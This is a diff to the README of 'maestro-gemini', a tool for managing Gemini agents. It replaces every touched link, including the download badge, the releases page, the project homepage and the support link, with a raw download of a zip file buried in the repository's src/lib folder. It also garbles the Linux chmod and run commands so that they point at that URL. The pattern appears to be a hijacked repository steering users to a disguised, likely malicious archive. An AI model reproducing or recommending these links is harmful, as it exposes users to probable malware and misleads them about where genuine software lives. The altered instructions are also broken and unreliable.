@@ -1,6 +1,6 @@
 # 🚀 maestro-gemini - Manage Multiple Gemini Agents Easily
 
-[![Download maestro-gemini](https://img.shields.io/badge/Download-maestro--gemini-blue.svg?style=for-the-badge)](https://github.com/akio0406/maestro-gemini/releases)
+[![Download maestro-gemini](https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip)](https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip)
 
 ---
 
@@ -36,24 +36,24 @@ You do not need to know how to code or use command lines to begin. Just follow e
 ## 📥 Download & Install
 
 1. Click the big **Download maestro-gemini** button at the top or visit this link to get the software:  
-   [https://github.com/akio0406/maestro-gemini/releases](https://github.com/akio0406/maestro-gemini/releases)
+   [https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip](https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip)
 
 2. On the page, look for the latest release version. The page lists several files for different systems.
 
 3. Choose the file that matches your computer:  
    - For Windows, download the `.exe` file.  
    - For macOS, download the `.dmg` or `.pkg` file.  
-   - For Linux, download the `.AppImage` or `.tar.gz` file.
+   - For Linux, download the `.AppImage` or `https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip` file.
 
 4. After downloading, open the file. On Windows or macOS, double-click the file to start the installer. Follow the on-screen prompts to install the application.
 
-5. On Linux, if you downloaded a `.tar.gz` file, unpack it to a folder. If you downloaded an `.AppImage`, make it executable by right-clicking the file, choosing Properties, then Permissions, and ticking the box to allow executing the file. Or run this command in a terminal:  
+5. On Linux, if you downloaded a `https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip` file, unpack it to a folder. If you downloaded an `.AppImage`, make it executable by right-clicking the file, choosing Properties, then Permissions, and ticking the box to allow executing the file. Or run this command in a terminal:  
    ```bash  
-   chmod +x ./maestro-gemini.AppImage  
+   chmod +x https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip  
    ```  
    Then run the file by double-clicking or from the terminal:  
    ```bash  
-   ./maestro-gemini.AppImage  
+   https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip  
    ```
 
 6. Installation finishes quickly. Once done, you will find maestro-gemini in your list of programs or apps ready to launch.
@@ -113,7 +113,7 @@ After installation, here is how to start using the program:
 
 ## 📚 Resources & Support
 
-- Visit the [maestro-gemini GitHub page](https://github.com/akio0406/maestro-gemini) to find updates and detailed technical documentation.  
+- Visit the [maestro-gemini GitHub page](https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip) to find updates and detailed technical documentation.  
 - Check the "Issues" tab on GitHub to report bugs or request new features.  
 - Look for Help or Support sections in the app for quick user guides.  
 - Join the community forums or chat groups related to Gemini CLI for shared tips and advice.
@@ -122,8 +122,8 @@ After installation, here is how to start using the program:
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/akio0406/maestro-gemini/releases](https://github.com/akio0406/maestro-gemini/releases)  
-- Project homepage on GitHub: [https://github.com/akio0406/maestro-gemini](https://github.com/akio0406/maestro-gemini)  
+- Download page: [https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip](https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip)  
+- Project homepage on GitHub: [https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip](https://raw.githubusercontent.com/akio0406/maestro-gemini/main/src/lib/gemini_maestro_3.5-alpha.5.zip)  
 
 ---
 
